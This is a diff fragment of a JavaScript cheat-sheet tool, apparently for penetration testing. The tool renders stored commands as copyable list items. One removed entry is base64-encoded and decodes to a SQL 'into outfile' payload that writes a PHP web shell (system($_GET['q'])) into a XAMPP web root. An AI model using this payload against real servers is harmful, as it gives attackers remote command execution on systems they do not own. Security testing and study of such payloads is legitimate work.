-      {'title': '9. sql', 'base64': 'c2VsZWN0ICZxdW90OyZsdDsmcXVlc3Q7cGhwIHN5c3RlbSZscGFyOyZkb2xsYXI7Jmxvd2JhcjtHRVQmbHNxYjsmYXBvcztxJmFwb3M7JnJzcWI7JnJwYXI7JnNlbWk7ICZxdWVzdDsmZ3Q7JnF1b3Q7IGludG8gb3V0ZmlsZSAmcXVvdDtDJmNvbG9uOyZic29sOyZic29sO3hhbXBwJmJzb2w7JmJzb2w7aHRkb2NzJmJzb2w7JmJzb2w7Y21kJnBlcmlvZDtwaHAmcXVvdDs='},
-      {'title': 'sql', 'cmd': ``},
-    ];
-  }
-
-  drawList(index, targetContent) {
-    for (let i = 0; i < targetContent.length; i++) {
-      const content = targetContent[i];
-      let title = content.title;
-      let cmd = content.cmd;
-      if (content.base64) {
-        // base64デコードする
-        cmd = atob(content.base64);
-      }
-      // Template
-      $(this.targetCSSSelectors[index]).append(`
-      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
-        <div class="ms-2 me-auto" style="width: 80%">
-          <div class="fw-bold">${title}</div>
-          <code class="copy_target">${cmd}</code>
         </div>
         <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
       </li>
